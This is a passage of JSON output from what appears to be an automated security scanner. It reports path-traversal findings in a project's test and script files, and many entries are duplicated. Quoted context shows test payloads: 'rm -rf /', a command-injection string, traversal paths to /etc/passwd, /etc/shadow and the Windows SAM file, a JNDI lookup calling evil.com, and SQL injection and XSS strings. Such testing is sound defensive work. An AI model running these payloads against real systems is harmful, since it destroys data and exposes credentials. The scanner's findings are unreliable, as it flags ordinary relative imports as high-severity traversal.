            "context": "                {\"command\": \"rm -rf /\", \"description\": \"Dangerous command\"},\n                {\"command\": \"'; rm -rf /; echo '\", \"description\": \"Command injection\"},\n                {\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},\n                {\"query\": \"<script>alert('xss')</script>\", \"count\": 1},  # For search\n            ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_testing_framework.py",
            "line": 1214,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},",
            "context": "                {\"command\": \"rm -rf /\", \"description\": \"Dangerous command\"},\n                {\"command\": \"'; rm -rf /; echo '\", \"description\": \"Command injection\"},\n                {\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},\n                {\"query\": \"<script>alert('xss')</script>\", \"count\": 1},  # For search\n            ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_testing_framework.py",
            "line": 1214,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},",
            "context": "                {\"command\": \"rm -rf /\", \"description\": \"Dangerous command\"},\n                {\"command\": \"'; rm -rf /; echo '\", \"description\": \"Command injection\"},\n                {\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},\n                {\"query\": \"<script>alert('xss')</script>\", \"count\": 1},  # For search\n            ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_testing_framework.py",
            "line": 1214,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},",
            "context": "                {\"command\": \"rm -rf /\", \"description\": \"Dangerous command\"},\n                {\"command\": \"'; rm -rf /; echo '\", \"description\": \"Command injection\"},\n                {\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},\n                {\"query\": \"<script>alert('xss')</script>\", \"count\": 1},  # For search\n            ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_testing_framework.py",
            "line": 1214,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},",
            "context": "                {\"command\": \"rm -rf /\", \"description\": \"Dangerous command\"},\n                {\"command\": \"'; rm -rf /; echo '\", \"description\": \"Command injection\"},\n                {\"command\": \"../../../etc/passwd\", \"description\": \"Path traversal\"},\n                {\"query\": \"<script>alert('xss')</script>\", \"count\": 1},  # For search\n            ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \n            # Path manipulation\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \n            # Path manipulation\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \n            # Path manipulation\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \n            # Path manipulation\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \n            # Path manipulation\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \n            # Path manipulation\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 197,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../\",",
            "context": "        \"\"\"Load path traversal test payloads.\"\"\"\n        return [\n            \"../\",\n            \"..\\\\\",\n            \"../../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 197,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../\",",
            "context": "        \"\"\"Load path traversal test payloads.\"\"\"\n        return [\n            \"../\",\n            \"..\\\\\",\n            \"../../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 199,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \"../\",\n            \"..\\\\\",\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 199,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \"../\",\n            \"..\\\\\",\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 199,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \"../\",\n            \"..\\\\\",\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 199,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \"../\",\n            \"..\\\\\",\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 199,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \"../\",\n            \"..\\\\\",\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 199,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "            \"../\",\n            \"..\\\\\",\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 201,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//\",\n            \"....\\\\\\\\\",\n            \"%2e%2e%2f\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 201,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//\",\n            \"....\\\\\\\\\",\n            \"%2e%2e%2f\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 211,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"..%252f\",\n            \"..%255c\",\n            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 211,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"..%252f\",\n            \"..%255c\",\n            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 211,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"..%252f\",\n            \"..%255c\",\n            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 211,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"..%252f\",\n            \"..%255c\",\n            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 211,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"..%252f\",\n            \"..%255c\",\n            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 211,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"..%252f\",\n            \"..%255c\",\n            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 213,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",\n            \"C:\\\\inetpub\\\\wwwroot\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"file:///etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 213,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",\n            \"C:\\\\inetpub\\\\wwwroot\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"file:///etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 213,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",\n            \"C:\\\\inetpub\\\\wwwroot\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"file:///etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 213,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",\n            \"C:\\\\inetpub\\\\wwwroot\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"file:///etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 213,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",\n            \"C:\\\\inetpub\\\\wwwroot\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"file:///etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 213,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"/var/www/../../../etc/passwd\",",
            "context": "            \"....//....//....//etc/passwd\",\n            \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/var/www/../../../etc/passwd\",\n            \"C:\\\\inetpub\\\\wwwroot\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"file:///etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/run_memory_tests.py",
            "line": 14,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\n# Set test environment variables",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/run_memory_tests.py",
            "line": 14,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\n# Set test environment variables",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/memory_validation_suite.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\n# Import test utilities",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/memory_validation_suite.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\n# Import test utilities",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/circle_of_experts_performance_consultation.py",
            "line": 12,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/circle_of_experts_performance_consultation.py",
            "line": 12,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/setup_pipeline.py",
            "line": 450,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../../base'",
            "context": "            'kind': 'Kustomization',\n            'resources': [\n                '../../base'\n            ],\n            'namePrefix': f'{environment}-',",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/setup_pipeline.py",
            "line": 450,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../../base'",
            "context": "            'kind': 'Kustomization',\n            'resources': [\n                '../../base'\n            ],\n            'namePrefix': f'{environment}-',",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/setup_pipeline.py",
            "line": 450,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../../base'",
            "context": "            'kind': 'Kustomization',\n            'resources': [\n                '../../base'\n            ],\n            'namePrefix': f'{environment}-',",
            "cvss_score": 8.5
          },
          {
            "file": "scripts/setup_pipeline.py",
            "line": 450,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../../base'",
            "context": "            'kind': 'Kustomization',\n            'resources': [\n                '../../base'\n            ],\n            'namePrefix': f'{environment}-',",
            "cvss_score": 8.5
          },
          {
            "file": "benchmarks/circle_of_experts_performance.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "benchmarks/circle_of_experts_performance.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "benchmarks/performance_suite.py",
            "line": 30,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path for CODE imports\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\n@dataclass",
            "cvss_score": 8.5
          },
          {
            "file": "benchmarks/performance_suite.py",
            "line": 30,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))",
            "context": "\n# Add src to path for CODE imports\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))\n\n@dataclass",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/final_production_validation.py",
            "line": 459,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "k8s_path = Path('../k8s')",
            "context": "    def _validate_k8s_manifests(self) -> Dict[str, Any]:\n        \"\"\"Validate Kubernetes manifests\"\"\"\n        k8s_path = Path('../k8s')\n        if k8s_path.exists():\n            manifests = list(k8s_path.glob('*.yaml'))",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/final_production_validation.py",
            "line": 459,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "k8s_path = Path('../k8s')",
            "context": "    def _validate_k8s_manifests(self) -> Dict[str, Any]:\n        \"\"\"Validate Kubernetes manifests\"\"\"\n        k8s_path = Path('../k8s')\n        if k8s_path.exists():\n            manifests = list(k8s_path.glob('*.yaml'))",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 255,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../etc/passwd\",",
            "context": "            \"'; DROP TABLE users; --\",\n            \"<script>alert('XSS')</script>\",\n            \"../../etc/passwd\",\n            \"\\x00\\x01\\x02\\x03\",\n            \"A\" * 10000,  # Buffer overflow test",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 255,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../etc/passwd\",",
            "context": "            \"'; DROP TABLE users; --\",\n            \"<script>alert('XSS')</script>\",\n            \"../../etc/passwd\",\n            \"\\x00\\x01\\x02\\x03\",\n            \"A\" * 10000,  # Buffer overflow test",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 255,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../etc/passwd\",",
            "context": "            \"'; DROP TABLE users; --\",\n            \"<script>alert('XSS')</script>\",\n            \"../../etc/passwd\",\n            \"\\x00\\x01\\x02\\x03\",\n            \"A\" * 10000,  # Buffer overflow test",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 255,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../etc/passwd\",",
            "context": "            \"'; DROP TABLE users; --\",\n            \"<script>alert('XSS')</script>\",\n            \"../../etc/passwd\",\n            \"\\x00\\x01\\x02\\x03\",\n            \"A\" * 10000,  # Buffer overflow test",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 259,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/shadow\",",
            "context": "            \"A\" * 10000,  # Buffer overflow test\n            \"${jndi:ldap://evil.com/exploit}\",\n            \"../../../etc/shadow\",\n            \"{{7*7}}\",  # Template injection\n            \"javascript:alert('XSS')\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 259,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/shadow\",",
            "context": "            \"A\" * 10000,  # Buffer overflow test\n            \"${jndi:ldap://evil.com/exploit}\",\n            \"../../../etc/shadow\",\n            \"{{7*7}}\",  # Template injection\n            \"javascript:alert('XSS')\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 259,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/shadow\",",
            "context": "            \"A\" * 10000,  # Buffer overflow test\n            \"${jndi:ldap://evil.com/exploit}\",\n            \"../../../etc/shadow\",\n            \"{{7*7}}\",  # Template injection\n            \"javascript:alert('XSS')\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 259,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/shadow\",",
            "context": "            \"A\" * 10000,  # Buffer overflow test\n            \"${jndi:ldap://evil.com/exploit}\",\n            \"../../../etc/shadow\",\n            \"{{7*7}}\",  # Template injection\n            \"javascript:alert('XSS')\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 259,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/shadow\",",
            "context": "            \"A\" * 10000,  # Buffer overflow test\n            \"${jndi:ldap://evil.com/exploit}\",\n            \"../../../etc/shadow\",\n            \"{{7*7}}\",  # Template injection\n            \"javascript:alert('XSS')\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 259,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/shadow\",",
            "context": "            \"A\" * 10000,  # Buffer overflow test\n            \"${jndi:ldap://evil.com/exploit}\",\n            \"../../../etc/shadow\",\n            \"{{7*7}}\",  # Template injection\n            \"javascript:alert('XSS')\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 291,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "elif \"../\" in input_str or \"..\\\\>\" in input_str:",
            "context": "        elif \"<script>\" in input_str or \"javascript:\" in input_str:\n            return \"XSS Attack\"\n        elif \"../\" in input_str or \"..\\\\>\" in input_str:\n            return \"Path Traversal\"\n        elif \"${\" in input_str or \"{{}}\" in input_str:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 291,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "elif \"../\" in input_str or \"..\\\\>\" in input_str:",
            "context": "        elif \"<script>\" in input_str or \"javascript:\" in input_str:\n            return \"XSS Attack\"\n        elif \"../\" in input_str or \"..\\\\>\" in input_str:\n            return \"Path Traversal\"\n        elif \"${\" in input_str or \"{{}}\" in input_str:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis.py",
            "line": 291,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "elif \"../\" in input_str or \"..\\\\>\" in input_str:",
            "context": "        elif \"<script>\" in input_str or \"javascript:\" in input_str:\n            return \"XSS Attack\"\n        elif \"../\" in input_str or \"..\\\\>\" in input_str:\n            return \"Path Traversal\"\n        elif \"${\" in input_str or \"{{}}\" in input_str:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "        (\"<script>alert('xss')</script>\", False),\n        (\"'; DROP TABLE users; --\", False),\n        (\"../../../etc/passwd\", False),\n        (\"rm -rf /\", False),\n        (\"SELECT * FROM users WHERE id=1\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "        (\"<script>alert('xss')</script>\", False),\n        (\"'; DROP TABLE users; --\", False),\n        (\"../../../etc/passwd\", False),\n        (\"rm -rf /\", False),\n        (\"SELECT * FROM users WHERE id=1\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "        (\"<script>alert('xss')</script>\", False),\n        (\"'; DROP TABLE users; --\", False),\n        (\"../../../etc/passwd\", False),\n        (\"rm -rf /\", False),\n        (\"SELECT * FROM users WHERE id=1\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "        (\"<script>alert('xss')</script>\", False),\n        (\"'; DROP TABLE users; --\", False),\n        (\"../../../etc/passwd\", False),\n        (\"rm -rf /\", False),\n        (\"SELECT * FROM users WHERE id=1\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "        (\"<script>alert('xss')</script>\", False),\n        (\"'; DROP TABLE users; --\", False),\n        (\"../../../etc/passwd\", False),\n        (\"rm -rf /\", False),\n        (\"SELECT * FROM users WHERE id=1\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
            "context": "        (\"<script>alert('xss')</script>\", False),\n        (\"'; DROP TABLE users; --\", False),\n        (\"../../../etc/passwd\", False),\n        (\"rm -rf /\", False),\n        (\"SELECT * FROM users WHERE id=1\", False),",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/test_input_validation.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../etc/passwd\", False),",
